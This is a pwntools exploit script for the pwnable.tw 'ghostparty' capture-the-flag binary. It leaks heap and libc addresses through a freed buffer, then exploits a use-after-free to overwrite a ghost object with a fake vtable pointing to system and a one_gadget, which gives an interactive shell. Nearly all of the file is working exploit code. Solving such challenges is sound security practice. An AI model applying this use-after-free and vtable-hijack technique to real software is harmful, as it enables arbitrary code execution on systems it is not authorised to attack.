from pwn import *


sla = lambda delim, data: p.sendlineafter(delim, data)
s = lambda data: p.send(data)


elf = context.binary = ELF('ghostparty')
libc = ELF('libc.so.6')




def add_ghost(name, age, msg, lightsaber, j):
    sla(b'Your choice :', b'1')
    sla(b'Name : ', name)
    sla(b'Age : ', str(age).encode())
    sla(b'Message : ', msg)
    sla(b'type of ghost :', b'10')
    sla(b'lightsaber : ', lightsaber)
    sla(b'choice : ', str(j).encode())
def add_vampire(name, age, msg, blood, j):
    sla(b'Your choice :', b'1')
    sla(b'Name : ', name)
    sla(b'Age : ', str(age).encode())
    sla(b'Message : ', msg)
    sla(b'type of ghost :', b'7')
    sla(b'blood :', blood)
    sla(b'choice : ', str(j).encode())
def show_ghost(index):
    sla(b'choice :', b'2')
    sla(b'which you want to show in the party : ', str(index).encode())
def remove(index):
    sla(b'choice :', b'4')
    sla(b'to remove from the party : ', str(index).encode())

#nc chall.pwnable.tw 10401
#p = remote('chall.pwnable.tw', 10401)
p = process()
#gdb.attach(p, gdbscript='''
#            c
#           heap chunks''')




add_ghost(b'nao', 18, b'i am nao hahaha', b'A'*0x10, 3)
# LEAK HEAP
show_ghost(0)
p.recvuntil(b'saber : ')
leak = p.recvline()[:-1]
leak = int.from_bytes(leak, byteorder='little')
print('leak: ', hex(leak))
heap = leak - 0x12c30
print('heap: ', hex(heap))





add_ghost(b'nao1', 1, b'A', b'A'*0x410, 3) # malloc a big chunk to put it in unsorted bin
# LEAK LIBC
show_ghost(1)
p.recvuntil(b'saber : ')
leak = p.recvline()[:-1]
leak = int.from_bytes(leak, byteorder='little')
print('leak: ', hex(leak))
libc.address = leak - 0x3c4048
print('libc: ', hex(libc.address))


ONE_GADGET = 0xef6d0
add_vampire(b'V', 1, b'A', b'C'*0x60, 3) # blood is freed when program calls speaking(*ghost)
add_ghost(b'A', 1, b'A', b'A', 3) # reuse the blood chunk before
remove(2) # free blood field so the ghost above is a freed chunk
#overwite the chunk above, remember to craft the right type and name field otherwise program will crash
add_vampire(b'A'*0x60, 1, b'A'*0x60, p64(heap + 0x12fb0)+ p64(libc.symbols['system'])*2 + p64(heap + 0x12fa0) + p64(0x0) + b'A'*8 + p64(ONE_GADGET + libc.address) + b'B'*0x28, 1)
sla(b'choice :', b'2')
sla(b'the party : ', b'2')


p.interactive()